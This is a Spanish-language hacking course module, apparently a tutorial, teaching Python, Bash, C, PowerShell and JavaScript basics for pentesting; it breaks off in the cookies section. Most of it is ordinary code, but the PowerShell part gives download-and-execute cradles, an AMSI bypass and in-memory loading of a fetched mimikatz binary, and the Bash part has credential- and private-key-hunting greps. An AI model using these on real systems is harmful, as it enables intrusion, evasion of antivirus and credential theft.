# Fundamentos de Programacion para Hacking

> ⏱️ **Tiempo estimado:** 30 horas (~6 sesiones) (3502 lineas)


> **Aviso:** Este material es estrictamente educativo. Todo lo que aprendas aca usalo solo en sistemas donde tengas [autorizacion](../raw/s3c-f0nd4m3nt0s.md#autorizacion) explicita. Meterte en sistemas ajenos sin permiso es ilegal y no me hago cargo de lo que hagas con esto.

---

## Tabla de Contenidos

1. [Python para Seguridad](#python)
2. [Bash Scripting](#bash)
3. [C/C++ para Exploits](#c)
4. [PowerShell para Windows Hacking](#powershell)
5. [JavaScript para Web Hacking](#javascript)
6. [SQL para Inyeccion](#sql)
7. [Herramientas y Flujo de Trabajo](#herramientas)

---

---

## [python](../raw/pyth0n-f0r-h4ck1ng.md) para Seguridad {[python](../raw/pyth0n-f0r-h4ck1ng.md)}

Python es EL lenguaje mas importante para pentesting y seguridad ofensiva. No hay herramienta que no tenga algo en Python. Desde escaners de puertos hasta exploits complejos, Python te da la velocidad para prototipar y el poder de las librerias.

### 1.1 Variables y Tipos Basicos

Python es de tipado dinamico. No declaras el tipo, el [interprete](../raw/pr0gr4mm1ng-f0nd4m3nt0s.md#interpretes) lo infiere solo.

```python
nombre = "Octavio"
edad = 28
altura = 1.75
es_hacker = True
```

**Tipos de datos basicos:**

- `str` — cadenas de texto
- `int` — numeros enteros (sin limite de tamanho)
- `float` — numeros con coma flotante
- `bool` — True o False
- `NoneType` — valor nulo (None)
- `bytes` — datos binarios
- `bytearray` — bytes mutables

```python
# Strings
texto = "hola mundo"
texto2 = 'tambien con comillas simples'
texto3 = """texto
multilinea"""

# Enteros
entero = 42
hexadecimal = 0xff   # 255
binario = 0b1010     # 10
octal = 0o77         # 63

# Floats
flotante = 3.1416
cientifico = 1.5e-3  # 0.0015

# Booleanos
flag = True
otro_flag = False

# None
nada = None
```

```python
# Ver el tipo de una variable
print(type(nombre))   # <class 'str'>
print(type(edad))     # <class 'int'>
```

**Conversion entre tipos (casting):**

```python
# String a int
numero = int("42")

# Int a string
texto = str(42)

# String a float
flotante = float("3.14")

# Cualquier cosa a bool
verdad = bool(1)
falso = bool(0)
vacio = bool("")
tambien = bool("a")
```

### 1.2 Estructuras de Datos

Python tiene 4 estructuras principales: lista, tupla, [diccionario](../raw/p4ssw0rd-4tt4cks.md#ataque-de-diccionario), [set](../raw/ph1sh1ng.md#social-engineering-toolkit).

#### Listas (`list`)

Mutables, ordenadas, indexadas. La estructura mas versatil.

```python
lista = [1, 2, 3, 4, 5]
mix = [1, "dos", 3.0, True, None]
vacia = []
print(lista[0])    # 1
print(lista[-1])   # 5
print(lista[1:3])  # [2, 3]
print(lista[::2])  # [1, 3, 5]
print(lista[::-1]) # [5, 4, 3, 2, 1]
lista.append(6)
lista.insert(0, 0)
lista.pop()
lista.remove(3)
del lista[0]
lista.sort()
len(lista)
sum(lista)
```

#### Tuplas (`tuple`)

Inmutables, ordenadas, mas rapidas que listas.

```python
tupla = (1, 2, 3)
a, b, c = (1, 2, 3)
a, *resto = (1, 2, 3, 4)
```

#### Diccionarios (`dict`)

Pares clave-valor, mutables.

```python
dic = {"nombre": "Octavio", "edad": 28}
print(dic["nombre"])
print(dic.get("edad"))
dic["pais"] = "Argentina"
del dic["pais"]
dic.keys()
dic.values()
dic.items()
for k, v in dic.items():
    print(k, v)
d1 | d2  # merge (3.9+)
```

#### Sets (`set`)

Coleccion no ordenada de elementos unicos.

```python
s = {1, 2, 3, 3, 3}  # {1, 2, 3}
s.add(4)
s.remove(3)
a | b  # union
a & b  # interseccion
a - b  # diferencia
```

### 1.3 Strings en Profundidad

Los strings en Python son inmutables.

```python
s = "hola mundo"
s[0]     # 'h'
s[0:4]   # 'hola'
s.upper()
s.lower()
s.strip()
s.startswith('hola')
s.find('mundo')
s.replace('mundo', 'mundo')
s.split(',')
','.join(['a', 'b', 'c'])
```

#### Formateo de Strings

```python
msg = f"Hola {nombre}, tenes {edad} anhos"
msg = "Hola %s, tenes %d anhos" % (nombre, edad)
msg = "Valor: %08x" % 255
msg = "Hola {}".format(nombre)
msg = f"Hex: {255:08x}"
msg = f"Float: {3.14159:.2f}"
```

#### Expresiones Regulares con `re`

```python
import re
texto = 'IPs: 192.168.1.1, 10.0.0.1'
patron = re.compile(r'\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b')
ips = patron.findall(texto)
print(ips)  # ['192.168.1.1', '10.0.0.1']

# Substitution
nuevo = re.sub(r'\d+\.\d+\.\d+\.\d+', 'REDACTED', texto)
```

### 1.4 Control de Flujo

```python
if edad >= 18:
    print("sos mayor")
elif edad >= 13:
    print("sos adolescente")
else:
    print("sos menor")

status = "mayor" if edad >= 18 else "menor"

# match/case (3.10+)
match comando:
    case "scan":
        print("Escanendo...")
    case "exit":
        return False
    case _:
        print("Desconocido")
```

```python
# Bucles
for i in [1, 2, 3]:
    print(i)

for i in range(10):
    print(i)

for i in range(2, 10, 2):
    print(i)

for idx, val in enumerate(["a", "b"]):
    print(idx, val)

for n, e in zip(nombres, edades):
    print(n, e)

while contador < 10:
    contador += 1

# List comprehensions
cuadrados = [x**2 for x in range(10)]
pares = [x for x in range(20) if x % 2 == 0]
cuadrados_dict = {x: x**2 for x in range(5)}
```

### 1.5 Funciones

```python
def saludar(nombre):
    return f"Hola {nombre}"

def conectar(host, puerto=80, timeout=30):
    print(f"Conectando a {host}:{puerto}")

def registro(*args, **kwargs):
    print(args, kwargs)

lambda x: x * 2

@log_ejecucion
def escanear(ip):
    print(f"Escanendo {ip}")
```

### 1.6 Manejo de Errores

```python
try:
    resultado = 10 / 0
except ZeroDivisionError:
    print("No se puede dividir por cero")
except Exception as e:
    print(f"Error: {e}")
else:
    print("Sin errores")
finally:
    print("Siempre se ejecuta")

def validar_ip(ip):
    if len(ip.split(".")) != 4:
        raise ValueError(f"IP invalida: {ip}")

with open("archivo.txt", "r") as f:
    contenido = f.read()
```

### 1.7 Archivos y Entrada/Salida

```python
# Modos: 'r', 'w', 'a', 'x', 'b', 't', '+'
with open("archivo.txt", "r") as f:
    contenido = f.read()

with open("archivo.txt", "r") as f:
    for linea in f:
        print(linea.strip())

with open("output.txt", "w") as f:
    f.write("Hola mundo\n")

with open("log.txt", "a") as f:
    f.write("nueva entrada\n")

with open("exploit.bin", "wb") as f:
    f.write(b'\x41\x42\x43')

with open("archivo.txt", "rb") as f:
    f.seek(10)
    datos = f.read(4)
    print(datos.hex())
```

### 1.8 Modulos y Paquetes

```python
import os
import sys
import socket
import subprocess as sp
from socket import socket, AF_INET, SOCK_STREAM

if __name__ == "__main__":
    main()
```

### 1.9 Modulos Esenciales para Hacking

#### `os` - [sistema operativo](../raw/0s-f0nd4m3nt0s.md#sistemas-operativos)

```python
import os
os.getcwd()
os.chdir("/tmp")
os.listdir(".")
os.environ.get("PATH")
os.path.exists("archivo.txt")
os.path.isfile("archivo.txt")
os.path.getsize("archivo.txt")
os.path.join("dir", "subdir", "file.txt")
for root, dirs, files in os.walk("/etc"):
    for f in files:
        ruta = os.path.join(root, f)
        print(ruta)
```

#### `sys` - Sistema e Interprete

```python
import sys
print(sys.argv)
sys.exit(0)
sys.stdout.write("Mensaje")
```

#### `socket` - Comunicacion de [red](../raw/r3d3s-f0nd4m3nt0s.md)

```python
import socket

# Cliente TCP
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.settimeout(5)
try:
    s.connect(("192.168.1.1", 80))
    s.send(b'GET / HTTP/1.1\r\nHost: 192.168.1.1\r\n\r\n')
    respuesta = s.recv(4096)
    print(respuesta.decode())
except socket.timeout:
    print("Timeout")
finally:
    s.close()

# Servidor TCP
servidor = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
servidor.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
servidor.bind(("0.0.0.0", 4444))
servidor.listen(5)
while True:
    cliente, addr = servidor.accept()
    print(f"Conexion desde {addr}")
    datos = cliente.recv(1024)
    cliente.send(b"Bienvenido!\n")
    cliente.close()

# UDP
udp = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
udp.sendto(b"datos", ("192.168.1.1", 53))
datos, addr = udp.recvfrom(1024)
```

#### `subprocess`

```python
import subprocess
resultado = subprocess.run(["whoami"], capture_output=True, text=True)
print(resultado.stdout)

proceso = subprocess.Popen(["ping", "8.8.8.8"], stdout=subprocess.PIPE, text=True)
for linea in proceso.stdout:
    print(linea.strip())
```

#### `json`

```python
import json
obj = json.loads('{"nombre": "Octavio"}')
print(obj["nombre"])

with open("config.json", "r") as f:
    config = json.load(f)

with open("output.json", "w") as f:
    json.dump(resultados, f, indent=2)
```

#### `hashlib`

```python
import hashlib
hashlib.md5(b"datos").hexdigest()
hashlib.sha256(b"datos").hexdigest()
hashlib.sha512(b"datos").hexdigest()

import hmac
h = hmac.new(b"key", b"msg", hashlib.sha256).hexdigest()
```

#### `base64`

```python
import base64
cod = base64.b64encode(b"Hola mundo")
dec = base64.b64decode(cod)
urlsafe = base64.urlsafe_b64encode(b"datos???")
```

#### `struct`

```python
import struct
packed = struct.pack("<I", 255)
print(packed.hex())  # ff000000
a, b, c = struct.unpack("<IHH", packed)

import socket
ip_packed = socket.inet_aton("192.168.1.1")
ip_unpacked = socket.inet_ntoa(ip_packed)
```

#### `ctypes`

```python
import ctypes
libc = ctypes.CDLL("msvcrt.dll")
libc.printf(b"Hola desde C\n")
```

#### `threading`

```python
import threading

def escanear_puerto(ip, puerto):
    import socket
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(1)
    try:
        s.connect((ip, puerto))
        print(f"Puerto {puerto} ABIERTO")
    except: pass
    finally: s.close()

hilos = []
for p in range(1, 1025):
    t = threading.Thread(target=escanear_puerto, args=("192.168.1.1", p))
    hilos.append(t)
    t.start()

for t in hilos:
    t.join()
```

### 1.10 Argumentos de Linea de Comandos

```python
import sys
if len(sys.argv) < 2:
    print(f'Uso: {sys.argv[0]} <target>')
    sys.exit(1)

import argparse
parser = argparse.ArgumentParser(description="Escanedor")
parser.add_argument("-t", "--target", required=True)
parser.add_argument("-p", "--ports", default="1-1024")
parser.add_argument("-v", "--verbose", action="store_true")
args = parser.parse_args()
```

### 1.11 Proyectos Practicos

#### Port Scanner

```python
import socket
ip = "192.168.1.1"
for puerto in range(1, 1025):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(0.5)
    r = s.connect_ex((ip, puerto))
    if r == 0:
        print(f"Puerto {puerto} ABIERTO")
    s.close()
```

#### [http](../raw/r3d3s-f0nd4m3nt0s.md#http) Client

```python
import socket
def http_get(host):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(5)
    s.connect((host, 80))
    s.send(b"GET / HTTP/1.1\r\nHost: " + host.encode() + b"\r\n\r\n")
    resp = b""
    while True:
        d = s.recv(4096)
        if not d: break
        resp += d
    s.close()
    return resp.decode()
```

#### HTTP con requests

```python
import requests
r = requests.get("https://api.example.com/users")
print(r.json())

r = requests.post("https://api.example.com/login",
    data={"user": "admin", "pass": "admin123"})

r = requests.get("https://target.com", headers={"User-Agent": "custom"})

session = requests.Session()
session.auth = ("user", "pass")
```

#### XOR Cipher

```python
def xor(data, key):
    kb = key.encode() if isinstance(key, str) else key
    db = data.encode() if isinstance(data, str) else data
    return bytes(db[i] ^ kb[i % len(kb)] for i in range(len(db)))
```

---

## Bash [scripting](../raw/pyth0n-f0r-h4ck1ng.md#scripting) {bash}

Bash es el lenguaje de scripting por excelencia en Linux. Es la base de herramientas como [nmap](../raw/nm4p.md), [metasploit](../raw/m3t4spl01t.md), y practicamente todo en Kali Linux.

### 2.1 Shebang y Ejecucion

```bash
#!/bin/bash
chmod +x script.sh
./script.sh
bash script.sh
source script.sh
```

### 2.2 Variables

```bash
nombre="Octavio"
edad=28
echo $nombre
echo "$nombre"
echo '$nombre'
fecha=$(date)

# Variables especiales
echo "Script: $0"
echo "Args: $1 $2 $3"
echo "Todos: $@"
echo "Cantidad: $#"
echo "Exit code: $?"
echo "PID: $$"

# Arrays
frutas=("manzana" "pera" "banana")
echo "${frutas[0]}"
echo "${#frutas[@]}"

# Arrays asociativos
declare -A ips
ips[web]="192.168.1.10"
echo "${ips[web]}"
```

### 2.3 Quotes y Escaping

```bash
echo "Hola $nombre"    # expande variable
echo 'Hola $nombre'    # literal
echo "Precio: \$100"  # escapar $

# ANSI-C quoting
echo $'Linea 1\nLinea 2'
```

### 2.4 Condicionales

```bash
if [ "$1" = "admin" ]; then
    echo "Modo admin"
elif [ "$1" = "user" ]; then
    echo "Modo user"
else
    echo "Desconocido"
fi

# Operadores: -eq -ne -lt -le -gt -ge = != -z -n -f -d -x
if [ "$edad" -ge 18 ]; then
    echo "Mayor"
fi

if [ -f /etc/passwd ]; then
    echo "Existe"
fi

# Doble corchete (bashismo)
if [[ "$string" == h* ]]; then
    echo "Arranca con h"
fi

if [[ "$string" =~ ^h[a-z]+$ ]]; then
    echo "Regex match"
fi

# case
case $cmd in
    start) echo "Iniciando..." ;;
    stop) echo "Deteniendo..." ;;
    *) echo "Desconocido" ;;
esac
```

### 2.5 Bucles

```bash
# For sobre lista
for ip in 192.168.1.1 192.168.1.2; do
    ping -c 1 "$ip" > /dev/null && echo "$ip responde"
done

# For estilo C
for ((i=0; i<10; i++)); do
    echo "i = $i"
done

# While
contador=1
while [ "$contador" -le 5 ]; do
    echo "$contador"
    ((contador++))
done

# While leyendo archivo
while IFS= read -r linea; do
    echo "$linea"
done < /etc/passwd

# Until
until [ "$contador" -gt 5 ]; do
    echo "$contador"
    ((contador++))
done

# break y continue
for i in {1..100}; do
    [ "$i" -eq 5 ] && continue
    [ "$i" -gt 10 ] && break
    echo "$i"
done
```

### 2.6 Funciones

```bash
scan_port() {
    local ip="$1"
    local puerto="$2"
    (echo >/dev/tcp/"$ip"/"$puerto") 2>/dev/null && echo "$puerto ABIERTO"
}

check_root() {
    [ "$(id -u)" -eq 0 ] && return 0 || return 1
}

connect() {
    local host="${1:-localhost}"
    local port="${2:-80}"
    echo "Conectando a $host:$port"
}
```

### 2.7 I/O Redirection

```bash
comando > archivo      # stdout (sobrescribe)
comando >> archivo     # stdout (append)
comando < archivo      # stdin
comando 2> archivo     # stderr
comando &> archivo     # stdout + stderr

# Heredoc
cat << EOF > config.txt
url=http://example.com
timeout=30
EOF

# Pipe
ps aux | grep python | grep -v grep

# Tee
ping -c 5 google.com | tee resultado.txt

# Process substitution
diff <(ls dir1) <(ls dir2)
```

### 2.8 String Manipulation

```bash
texto="Hola Mundo desde Bash"
echo "${#texto}"           # largo
echo "${texto:0:4}"      # 'Hola'
echo "${texto: -4}"      # 'Bash'

archivo="imagen.jpg.tar.gz"
echo "${archivo#*.}"       # jpg.tar.gz
echo "${archivo##*.}"      # gz
echo "${archivo%.*}"       # imagen.jpg.tar
echo "${archivo%%.*}"      # imagen

url="http://example.com"
echo "${url/http/https}"

echo "${nombre:-anonimo}"

texto="hola mundo"
echo "${texto^^}"          # HOLA MUNDO
echo "${texto,,}"          # hola mundo
```

### 2.9 Comandos Esenciales

#### find

```bash
find / -name "*.conf" 2>/dev/null
find / -type f
find / -type d
find / -size +100M
find / -perm -4000        # SUID (esencial!)
find / -mtime -1          # ultimas 24hs
find /tmp -name "*.tmp" -exec rm {} \;
find / -name "*.log" -print0 | xargs -0 grep "password"
```

#### grep

```bash
grep "root" /etc/passwd
grep -r "password" /etc/
grep -i "error" log.txt
grep -v "root" passwd
grep -l "admin" *.txt
grep -c "ERROR" log.txt
grep -n "patron" archivo.txt
grep -o "id=[0-9]*" html
grep -A 3 "ERROR" log.txt
grep -P "\d+\.\d+\.\d+\.\d+" log.txt

# Pentesting patterns
grep -r "password" . --include="*.php" --include="*.py" 2>/dev/null
grep -rl "BEGIN.*PRIVATE KEY" /home 2>/dev/null
grep -r "api_key\|apikey\|API_KEY" . 2>/dev/null
```

#### sed

```bash
sed 's/root/admin/' /etc/passwd
sed 's/root/admin/g' /etc/passwd
sed -i 's/old/new/g' archivo.txt
sed -n '1,10p' archivo.txt
sed '/^$/d' archivo.txt
sed -e 's/foo/bar/g' -e 's/baz/qux/g' archivo.txt
sed -e 's/#.*$//' -e '/^$/d' config.conf
```

#### awk

```bash
awk '{print \$1, \$3}' /etc/passwd
awk -F: '{print \$1, \$6}' /etc/passwd
awk -F: '\$3 >= 1000 {print \$1}' /etc/passwd
awk '{suma += \$1} END {print suma}' numeros.txt
awk '{print \$1}' access.log | sort | uniq -c | sort -rn | head -10
```

### 2.10 One-Liners Pentesting

```bash
# Port scanning
for p in {1..1024}; do (echo >/dev/tcp/192.168.1.1/$p) 2>/dev/null && echo "$p abierto"; done

# Hosts vivos
for i in {1..254}; do ping -c 1 -W 1 192.168.1.$i | grep "64 bytes" & done

# HTTP headers
curl -sI https://target.com | head -20

# Subdominios
curl -s "https://crt.sh/?q=%25.target.com&output=json" | jq -r '.[].name_value' | sort -u

# Buscar passwords
grep -r "password\s*=" . --include="*.php" --include="*.py" --include="*.js" 2>/dev/null

# SUID
find / -perm -4000 -type f 2>/dev/null

# Base64
echo "Hola mundo" | base64
echo "SG9sYSBtdW5kbw==" | base64 -d

# Hashing
echo -n "password" | sha256sum
```

### 2.11 Debugging y Seguridad

```bash
bash -x script.sh    # debug mode
bash -n script.sh    # syntax check

set -e   # exit on error
set -u   # undefined vars = error
set -o pipefail
set -euo pipefail

# Traps
cleanup() { rm -f /tmp/temp; }
trap cleanup EXIT

# Validar input (evitar injection)
if [[ "$input" =~ ^[a-zA-Z0-9_]+$ ]]; then
    command "$input"
fi
```

---

## C/C++ para Exploits {c}

C es el lenguaje de los sistemas operativos, kernels, exploits clasicos y shellcode. Entender C es entender la memoria.

### 3.1 Sintaxis Basica

```c
#include <stdio.h>

int main() {
    printf("Hola mundo\n");
    return 0;
}
```

**Tipos de datos:**

```c
char c = 65;           // 1 byte
int i = 2147483647;    // 4 bytes
unsigned int ui;       // 0 a 4B
short s = 32767;       // 2 bytes
long l;                // 4 u 8 bytes
long long ll;          // 8 bytes
float f = 3.14f;       // 4 bytes
double d = 3.14159;    // 8 bytes
void *ptr = NULL;     // puntero generico

printf("int: %zu\n", sizeof(int));
```

**Control de flujo:**

```c
if (edad >= 18) {
    printf("Mayor\n");
} else { printf("Menor\n"); }

switch (opcion) {
    case 1: printf("Uno\n"); break;
    case 2: printf("Dos\n"); break;
    default: printf("Otro\n");
}

for (int i = 0; i < 10; i++) {
    printf("%d ", i);
}

while (i < 10) { printf("%d ", i++); }
do { printf("%d ", j++); } while (j < 10);
```

### 3.2 Arrays y Strings

```c
int nums[5] = {1, 2, 3, 4, 5};
int matrix[3][4];

#include <string.h>

char dest[32];
strncpy(dest, src, sizeof(dest)-1);  // seguro
strncat(dest, " Mundo", 31);         // seguro
int cmp = strcmp("abc", "abd");
int len = strlen(dest);
char *p = strstr(dest, "Mun");

char buf[256];
snprintf(buf, sizeof(buf), "IP: %s", "1.1.1.1");
```

### 3.3 Punteros

```c
int valor = 42;
int *ptr = &valor;     // ptr apunta a valor

printf("Valor: %d\n", *ptr);  // dereferencia = 42
*ptr = 100;                   // modifica valor

int *p = NULL;               // puntero nulo
if (p) { *p = 10; }          // check antes de usar

int arr[] = {10, 20, 30};
int *ap = arr;
printf("%d\n", *(ap+1));     // 20

void *gen = &valor;           // puntero generico
int *back = (int *)gen;
```

### 3.4 Memoria Dinamica

```c
#include <stdlib.h>

int *arr = malloc(10 * sizeof(int));
if (!arr) { exit(1); }

int *zeros = calloc(10, sizeof(int));  // todos 0
int *arr2 = realloc(arr, 20 * sizeof(int));

free(arr);
free(zeros);
// free(NULL) es seguro

// Memory leak: malloc sin free
// Dangling: return &stack_var
// Double free: free() dos veces
```

### 3.5 Estructuras y Unions

```c
typedef struct {
    char ip[16];
    int puerto;
} Conexion;

Conexion c = {"192.168.1.1", 443};
printf("%s:%d\n", c.ip, c.puerto);

// Packed struct (sin padding)
typedef struct __attribute__((packed)) {
    uint8_t a;
    uint16_t b;
    uint32_t c;
} Paquete;

// Union (comparten memoria)
union Dato { int i; float f; char b[4]; };
```

### 3.6 File I/O

```c
FILE *f = fopen("archivo.txt", "r");
if (!f) { perror("Error"); return 1; }

char linea[256];
while (fgets(linea, sizeof(linea), f)) {
    printf("%s", linea);
}
fclose(f);

f = fopen("salida.txt", "w");
fprintf(f, "Linea %d\n", 1);
fclose(f);

// Modo binario
f = fopen("datos.bin", "wb");
fwrite(data, sizeof(Registro), 100, f);
fclose(f);
```

### 3.7 [buffer overflow](../raw/pr0gr4mm1ng-f0nd4m3nt0s.md#buffer-overflow)

```c
// EJEMPLO VULNERABLE
void vulnerable() {
    char buffer[64];
    gets(buffer);  // PELIGRO! Sin limite
    strcpy(buffer, input);  // PELIGRO!
}

// Compilar SIN protecciones:
// gcc -fno-stack-protector -z execstack exploit.c -o exploit

// Stack layout (32-bit):
// [buffer] [EBP] [RET] [args...]
// Si escribis mas alla del buffer, pisas EBP y RET

// Version segura
void segura() {
    char buffer[64];
    fgets(buffer, sizeof(buffer), stdin);
}
```

### 3.8 Sockets en C

```c
#include <sys/socket.h>
#include <netinet/in.h>

// Servidor TCP
int fd = socket(AF_INET, SOCK_STREAM, 0);
struct sockaddr_in addr;
addr.sin_family = AF_INET;
addr.sin_addr.s_addr = INADDR_ANY;
addr.sin_port = htons(4444);

bind(fd, (struct sockaddr*)&addr, sizeof(addr));
listen(fd, 5);
int cliente = accept(fd, NULL, NULL);

char buf[1024];
recv(cliente, buf, sizeof(buf), 0);
send(cliente, "Hola", 5, 0);
close(cliente); close(fd);

// Cliente TCP
int sock = socket(AF_INET, SOCK_STREAM, 0);
addr.sin_port = htons(80);
inet_pton(AF_INET, "1.1.1.1", &addr.sin_addr);
connect(sock, (struct sockaddr*)&addr, sizeof(addr));
send(sock, "GET /\r\n", 6, 0);
recv(sock, buf, sizeof(buf), 0);
close(sock);
```

### 3.9 Compilacion GCC

```bash
gcc -o prog prog.c -Wall -Wextra -O2 -g

# Optimizacion: -O0 (debug) -O2 (default) -O3 (agresivo)
# Seguridad: -fstack-protector
# Exploits: -fno-stack-protector -z execstack -no-pie
# 32-bit: -m32
# Librerias: -lm (math), -lpthread, -lssl
```

### 3.10 Makefiles

```makefile
CC = gcc
CFLAGS = -Wall -Wextra -O2 -g
TARGET = exploit

$(TARGET): exploit.c
    $(CC) $(CFLAGS) -o $@ $<

clean:
    rm -f $(TARGET)

.PHONY: clean
```

---

## [powerShell](../raw/w1nd0ws-p0st3xpl01t.md#powershell) para Windows Hacking {[powerShell](../raw/w1nd0ws-p0st3xpl01t.md#powershell)}

PowerShell es el lenguaje de [scripting](../raw/pyth0n-f0r-h4ck1ng.md#scripting) de Microsoft. Esencial para hacking en Windows por su acceso directo a .NET.

### 4.1 Cmdlets vs Funciones

Cmdlets siguen el patron Verb-Noun: Get-Process, [set](../raw/ph1sh1ng.md#social-engineering-toolkit)-Content, Invoke-Command

Verbos comunes: Get, Set, New, Remove, Invoke, Test, Out, Format

```powershell
# Funciones personalizadas
function Scan-Port {
    param([string]$Target, [int]$Port = 80)
    $client = New-Object System.Net.Sockets.TcpClient
    $conn = $client.BeginConnect($Target, $Port, $null, $null)
    $wait = $conn.AsyncWaitHandle.WaitOne(1000, $false)
    if ($wait) {
        Write-Host "Puerto $Port ABIERTO" -ForegroundColor Green
    }
    $client.Close()
}
```

### 4.2 [pipeline](../raw/c1cd-h4ck1ng.md#pipeline)

```powershell
Get-Process | Where-Object { $_.CPU -gt 10 }
Get-Process | Select-Object Name, Id, CPU
Get-Process | Sort-Object CPU -Descending | Select-Object -First 5
Get-Process | Export-Csv procs.csv -NoTypeInformation
Get-Process | Group-Object Company | Sort-Object Count -Desc
Get-Process | Measure-Object CPU -Sum -Average
```

### 4.3 Variables

```powershell
$nombre = "Octavio"
[int]$numero = 42
[array]$lista = @(1, 2, 3)
[hashtable]$dic = @{clave = "valor"}

# Variables de entorno
$env:PATH
$env:USERNAME

# Scopes
$global:contador = 0
$script:config = "valor"
```

### 4.4 Comparacion

```powershell
-eq -ne -gt -lt -ge -le
-like -notlike
-match -notmatch
-contains -in
-is -isnot
-and -or -not

if ($edad -ge 18 -and $tienePermiso) {
    Write-Host "Acceso permitido"
}

if ("10.0.0.1" -in $ips) {
    Write-Host "IP en lista"
}
```

### 4.5 Remoting

```powershell
Invoke-Command -ComputerName TARGET -ScriptBlock { Get-Process }
Enter-PSSession -ComputerName TARGET
New-PSSession -ComputerName TARGET
```

### 4.6 Execution Policy y Bypass

```powershell
Get-ExecutionPolicy
powershell -ExecutionPolicy Bypass -File script.ps1
powershell -EncodedCommand $encoded
```

### 4.7 Cmdlets Utiles

```powershell
Get-Process
Get-Service
Get-WmiObject Win32_Process
Get-WmiObject Win32_UserAccount
Get-CimInstance Win32_Process
Get-ChildItem -Recurse -Filter "*.txt"
Get-Content C:\Users\*.txt
Get-EventLog -LogName Security -Newest 10
Get-ItemProperty HKLM:\Software\...\Run
```

### 4.8 Download Cradles

```powershell
# Invoke-WebRequest
Invoke-WebRequest -Uri "http://server/script.ps1" -OutFile s.ps1
iex (Invoke-WebRequest -Uri "http://server/script.ps1").Content

# Net.WebClient
(New-Object Net.WebClient).DownloadFile("http://server/p.exe", "C:\p.exe")
iex (New-Object Net.WebClient).DownloadString("http://server/ps.ps1")

# XMLHTTP
$o = New-Object -ComObject MSXML2.XMLHTTP
$o.Open("GET", "http://server/ps.ps1", $false)
$o.Send(); iex $o.ResponseText
```

### 4.9 .NET Access

```powershell
# TCP Client
$tcp = New-Object System.Net.Sockets.TCPClient("10.0.0.1", 4444)
$stream = $tcp.GetStream()
$writer = New-Object System.IO.StreamWriter($stream)
$writer.WriteLine("Hola")
$writer.Flush()

# Encoding
[System.Text.Encoding]::UTF8.GetString([byte[]]@(72,111,108,97))
[Convert]::ToBase64String([byte[]]@(72,111,108,97))

# DNS
[System.Net.Dns]::GetHostEntry("example.com")

# Add-Type (C# en memoria)
$code = @"
public class Test {
    public static void Run() {
        Console.WriteLine("Hola desde C#");
    }
}
"@
Add-Type -TypeDefinition $code -Language CSharp
[Test]::Run()
```

### 4.10 [amsi](../raw/3dr-3v4s10n.md#amsi) Basics

AMSI (Antimalware Scan Interface) escanea scripts PowerShell en Windows 10+. Detecta strings como "iex", "DownloadString", [ofuscacion](../raw/4pk-r3v3rs1ng.md#obfuscation).

```powershell
# Bypass basico
[Ref].Assembly.GetType("System.Management.Automation.AmsiUtils")
    .GetField("amsiInitFailed","NonPublic,Static")
    .SetValue($null,$true)

# Cargar assembly desde memoria
$bytes = (New-Object Net.WebClient).DownloadData("http://server/mimikatz.exe")
$assembly = [System.Reflection.Assembly]::Load($bytes)
$assembly.EntryPoint.Invoke($null, (, [string[]]@()))
```

---

## JavaScript para Web Hacking {javascript}

JavaScript es el lenguaje de la web. Para [xss](../raw/w3b-h4ck1ng.md#xss), [csrf](../raw/w3b-h4ck1ng.md#csrf) y manipulacion del DOM necesitas entender JS.

### 5.1 Variables y Tipos

```javascript
var nombre = "Octavio";  // function scope
let edad = 28;           // block scope
const PI = 3.1416;      // constante

let str = "texto";
let num = 42;
let bool = true;
let arr = [1, 2, 3];
let obj = {nombre: "Octavio", edad: 28};
let nulo = null;
let undef = undefined;

typeof "hola"   // "string"
typeof 42       // "number"
typeof true     // "boolean"
typeof {}       // "object"
typeof []       // "object" (cuidado!)

Number("42"), String(42), Boolean(1)
parseInt("42"), parseFloat("3.14")
```

### 5.2 Funciones

```javascript
function saludar(nombre) {
    return "Hola " + nombre;
}

const sumar = function(a, b) { return a + b; };

const doble = (x) => x * 2;  // arrow function
const suma = (a, b) => a + b;

function conectar(host, puerto = 80) {
    console.log(`Conectando a ${host}:${puerto}`);
}

[1,2,3].forEach(x => console.log(x));
[1,2,3].map(x => x ** 2);       // [1,4,9]
[1,2,3,4].filter(x => x%2==0);  // [2,4]
[1,2,3].reduce((a,x) => a+x, 0); // 6
```

### 5.3 Control de Flujo

```javascript
if (edad >= 18) {
    console.log("Mayor");
} else { console.log("Menor"); }

let status = edad >= 18 ? "Mayor" : "Menor";

switch(comando) {
    case "scan": console.log("Escanendo..."); break;
    case "exit": break;
    default: console.log("Desconocido");
}

for (let i = 0; i < 10; i++) { console.log(i); }
for (let ip of ips) { console.log(ip); }
for (let key in obj) { console.log(key, obj[key]); }
while (i < 10) { i++; }
```

### 5.4 DOM Manipulation

```javascript
document.getElementById("miId")
document.querySelector(".miClase")
document.querySelectorAll("div")

element.innerHTML = "<b>HTML</b>"
element.textContent = "Texto"
element.setAttribute("src", "img.jpg")
element.classList.add("activo")
element.style.color = "red"

let div = document.createElement("div")
div.textContent = "Nuevo"
document.body.appendChild(div)

element.addEventListener("click", (e) => {
    console.log("Click!", e.target)
})
```

### 5.5 JSON

```javascript
let obj = JSON.parse('{"nombre": "Octavio"}')
console.log(obj.nombre)

let json = JSON.stringify({ip: "1.1.1.1", puertos: [80, 443]}, null, 2)
```

### 5.6 Fetch API

```javascript
fetch("https://api.example.com/users")
    .then(r => r.json())
    .then(d => console.log(d))
    .catch(e => console.error(e))

async function getUsers() {
    let r = await fetch("https://api.example.com/users")
    let d = await r.json()
    console.log(d)
}

fetch("https://api.example.com/login", {
    method: "POST",
    headers: {"Content-Type": "application/json"},
    body: JSON.stringify({user: "admin", pass: "admin123"})
})
```

### 5.7 Cookies

```javascript
// Leer
console.log(document.cookie)

function getCookie(name) {
    let cookies = document.cookie.split("; ")
    for (let c of cookies) {
        let [k, v] = c.split("=")
        if (k === name) return v
    }
    return null
}

// Escribir
document.cookie = "session=abc123; path=/"
document.cookie = "session=abc123; Secure; HttpOnly"

// Eliminar
